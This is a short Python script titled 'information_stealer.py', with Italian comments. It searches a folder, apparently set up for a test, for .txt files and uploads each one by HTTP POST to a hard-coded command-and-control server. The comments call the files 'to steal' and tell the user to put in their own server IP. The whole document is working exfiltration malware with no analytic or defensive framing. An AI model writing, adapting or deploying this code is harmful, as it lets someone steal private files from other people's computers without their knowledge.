# information_stealer.py
import os
import requests

# Configura l'URL del server C2
C2_URL = "http://192.168.1.100/upload"  # Sostituisci con l'IP del tuo server

# Directory che contiene i file da rubare
TARGET_DIR = os.path.expanduser("~/Desktop/prova")

# Trova i file .txt nella directory specificata
def find_txt_files(directory):
    txt_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))
    return txt_files

# Invia il file al server
def send_file_to_c2(file_path):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(C2_URL, files=files)
    return response.status_code

if __name__ == "__main__":
    # Trova tutti i file .txt nella cartella di prova
    files = find_txt_files(TARGET_DIR)
    print(f"Trovati {len(files)} file da inviare.")

    # Invia ogni file al server C2
    for file in files:
        print(f"Inviando {file}...")
        status = send_file_to_c2(file)
        if status == 200:
            print(f"File {file} inviato con successo!")
        else:
            print(f"Errore nell'invio di {file}: {status}")
